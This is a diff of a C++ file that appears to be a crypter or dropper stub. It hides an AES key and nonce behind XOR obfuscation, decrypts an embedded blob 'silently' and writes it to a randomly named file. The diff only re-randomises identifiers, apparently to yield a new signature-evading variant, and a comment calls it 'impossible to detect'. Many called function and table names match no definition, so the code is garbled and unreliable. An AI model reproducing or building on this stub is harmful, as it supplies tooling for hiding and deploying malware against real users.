@@ -8,11 +8,11 @@
 #include <cstdint>
 
 // XOR obfuscated strings - impossible to detect
-std::string xrEfnKwbqUCJW() { uint8_t k = 37; uint8_t data[] = {16,70,64,17,16,23,16,64,68,71,71,65,23,22,16,64,64,17,67,22,28,20,64,16,18,19,22,29,20,16,68,17,}; std::string result; for (int i = 0; i < sizeof(data)/sizeof(data[0])-1; i++) result += static_cast<char>(data[i] ^ k); return result; }
-std::string xCTDgRnRezVpw() { uint8_t k = 250; uint8_t data[] = {152,201,195,202,204,203,206,206,202,206,207,159,158,152,204,200,201,159,207,207,156,194,158,155,206,194,200,158,200,159,204,194,}; std::string result; for (int i = 0; i < sizeof(data)/sizeof(data[0])-1; i++) result += static_cast<char>(data[i] ^ k); return result; }
+std::string xIULlJDMMAsWJ() { uint8_t k = 82; uint8_t data[] = {106,54,48,55,107,55,102,48,54,52,49,102,52,55,107,107,97,99,48,49,52,98,52,102,96,55,97,49,100,49,103,98,}; std::string result; for (int i = 0; i < sizeof(data)/sizeof(data[0])-1; i++) result += static_cast<char>(data[i] ^ k); return result; }
+std::string xwyrYcczrAZJV() { uint8_t k = 191; uint8_t data[] = {217,137,217,139,141,140,136,137,222,218,137,140,218,134,143,141,134,138,217,137,222,220,138,134,219,219,141,141,219,220,134,140,}; std::string result; for (int i = 0; i < sizeof(data)/sizeof(data[0])-1; i++) result += static_cast<char>(data[i] ^ k); return result; }
 
 // Obfuscated AES implementation
-static const uint8_t xOUpCLbOvhXpt[256] = {
+static const uint8_t xDvtTKCTiqdMy[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
     0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
@@ -32,7 +32,7 @@ static const uint8_t xOUpCLbOvhXpt[256] = {
 };
 
 // Completely obfuscated function names
-inline uint8_t xKfOBlKJfVYJj(uint8_t a, uint8_t b) {
+inline uint8_t xtbcVcjPYPsTG(uint8_t a, uint8_t b) {
     uint8_t p = 0;
     for (int i = 0; i < 8; i++) {
         if (b & 1) p ^= a;
@@ -44,13 +44,13 @@ inline uint8_t xKfOBlKJfVYJj(uint8_t a, uint8_t b) {
     return p;
 }
 
-inline void xtMUKuCrKAHbF(uint8_t* state) {
+inline void xlFIxvgGnwKWj(uint8_t* state) {
     for (int i = 0; i < 16; i++) {
-        state[i] = xKRDtIYVVYqat[state[i]];
+        state[i] = xjkWmLsXdNzsf[state[i]];
     }
 }
 
-inline void xueLRzNXDKPlz(uint8_t* state) {
+inline void xIeIGKfZkltoA(uint8_t* state) {
     uint8_t temp;
     temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
     temp = state[2]; state[2] = state[10]; state[10] = temp;
@@ -58,65 +58,65 @@ inline void xueLRzNXDKPlz(uint8_t* state) {
     temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
 }
 
-inline void xqbjRRudcsBSS(uint8_t* state) {
+inline void xVMJllwFWZHXq(uint8_t* state) {
     for (int i = 0; i < 4; i++) {
         uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
-        state[i*4] = xltnhKQItpxon(0x02, s0) ^ xwNIhOhTIseyp(0x03, s1) ^ s2 ^ s3;
-        state[i*4+1] = s0 ^ xiTGaTyKkVALq(0x02, s1) ^ xHlSphANRHtRK(0x03, s2) ^ s3;
-        state[i*4+2] = s0 ^ s1 ^ xHKTtVkIyvfcn(0x02, s2) ^ xElFDgdiJstTq(0x03, s3);
-        state[i*4+3] = xdlTuYuMfNpoe(0x03, s0) ^ s1 ^ s2 ^ xgMtPBvJZlHWm(0x02, s3);
+        state[i*4] = xXbCnqZQuXtOq(0x02, s0) ^ xHMGVKMUnQOUh(0x03, s1) ^ s2 ^ s3;
+        state[i*4+1] = s0 ^ xISGgpUOaSpma(0x02, s1) ^ xezPnTMRfXyaX(0x03, s2) ^ s3;
+        state[i*4+2] = s0 ^ s1 ^ xWbPoYwWLZXuI(0x02, s2) ^ xkUTtIVdYFheW(0x03, s3);
+        state[i*4+3] = xcZTmHeQQfkcq(0x03, s0) ^ s1 ^ s2 ^ xqGjNYHoFhgbn(0x02, s3);
     }
 }
 
-inline void xHsqowoepnFym(uint8_t* state, const uint8_t* roundKey) {
+inline void xoiuzhQOEBuCT(uint8_t* state, const uint8_t* roundKey) {
     for (int i = 0; i < 16; i++) {
         state[i] ^= roundKey[i];
     }
 }
 
-inline void xqNgzqsYCrAUY(const uint8_t* key, uint8_t* roundKeys) {
+inline void xtjSbYlCvHFfk(const uint8_t* key, uint8_t* roundKeys) {
     uint8_t temp[4];
     memcpy(roundKeys, key, 16);
     
     for (int i = 1; i < 11; i++) {
         memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
         uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
-        for (int j = 0; j < 4; j++) temp[j] = xrsMCumAaMCJT[temp[j]];
+        for (int j = 0; j < 4; j++) temp[j] = xBnnRCEpQQBWe[temp[j]];
         temp[0] ^= (1 << (i-1));
         for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
         for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
     }
 }
 
-inline void xHStTjqBGGlNe(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
+inline void xZNyJEBgcFPPk(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
     uint8_t state[16];
     memcpy(state, input, 16);
-    xzSrDsOkpgdwm(state, roundKeys);
+    xiAXkzBBnXNzj(state, roundKeys);
     
     for (int round = 1; round < 10; round++) {
-        xRWfOAzXKKOFL(state);
-        xKtEXdcuyCiTx(state);
-        xoSJtSbDHzNpf(state);
-        xNQPVZdyBIkRQ(state, roundKeys + round * 16);
+        xzIHPNPdpYmDi(state);
+        xyzueTbBqzUMH(state);
+        xflcGrPyDngIR(state);
+        xAcdnIFDDtzfL(state, roundKeys + round * 16);
     }
     
-    xIRxpMyGtiAJb(state);
-    xWfEFRrjvmaJc(state);
-    xydBEtPGNUCqL(state, roundKeys + 10 * 16);
+    xPArWjbtWErtP(state);
+    xDeQzjlslybJc(state);
+    xfhEvHzXWLiXe(state, roundKeys + 10 * 16);
     memcpy(output, state, 16);
 }
 
-inline void xaUreweEjhUvN(uint8_t* counter) {
+inline void xlGczhviyxAEI(uint8_t* counter) {
     for (int i = 15; i >= 0; i--) {
         counter[i]++;
         if (counter[i] != 0) break;
     }
 }
 
-inline void xlljOraruYEKf(const uint8_t* input, uint8_t* output, size_t length, 
+inline void xhXuTTzWRpCoC(const uint8_t* input, uint8_t* output, size_t length, 
                        const uint8_t* key, const uint8_t* nonce) {
     uint8_t roundKeys[176];
-    xWVDskpDLcAUp(key, roundKeys);
+    xWSlKdlTyBcZv(key, roundKeys);
     
     uint8_t counter[16];
     uint8_t keystream[16];
@@ -124,17 +124,17 @@ inline void xlljOraruYEKf(const uint8_t* input, uint8_t* output, size_t length,
     
     size_t processed = 0;
     while (processed < length) {
-        xoekIhXXkStKm(counter, keystream, roundKeys);
+        xSLVicjrAMntE(counter, keystream, roundKeys);
         size_t blockSize = (length - processed < 16) ? length - processed : 16;
         for (size_t i = 0; i < blockSize; i++) {
             output[processed + i] = input[processed + i] ^ keystream[i];
         }
         processed += blockSize;
-        xqfnefTwBMvIt(counter);
+        xLPAliOGdtJts(counter);
     }
 }
 
-void xOVDRgJIOTjSU(const std::string& hex, uint8_t* bytes) {
+void xKeVfJOPshCue(const std::string& hex, uint8_t* bytes) {
     for (size_t i = 0; i < hex.length(); i += 2) {
         bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
     }
@@ -143,18 +143,18 @@ void xOVDRgJIOTjSU(const std::string& hex, uint8_t* bytes) {
 int main() {
     // Get obfuscated key and nonce
     uint8_t key[16], nonce[16];
-    xOfkxGzmghEWv(xhtmJtbwBGvTr(), key);
-    xjZfHMpVUwoXT(xTsVWzzjQZMKE(), nonce);
+    xdGvcnvTHsdyv(xoFgmsfFqIOxW(), key);
+    xEZRgDsGivHap(xWeLiGdgqljAo(), nonce);
 
     // Embedded data (will be replaced by linker)
     uint8_t embeddedData[] = {0x00}; // Placeholder
     const size_t embeddedDataSize = sizeof(embeddedData);
 
     // Process the data silently
-    xiYRlFRUkClUJ(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+    xvwRgsmUsWkrm(embeddedData, embeddedData, embeddedDataSize, key, nonce);
 
     // Write processed data to file (completely random filename)
-    std::ofstream outFile("xtmVqdnqhjkIM.dat", std::ios::binary);
+    std::ofstream outFile("xtiuITjRlRSzj.dat", std::ios::binary);
     if (outFile.is_open()) {
         outFile.write(reinterpret_cast<const char*>(embeddedData), embeddedDataSize);
         outFile.close();
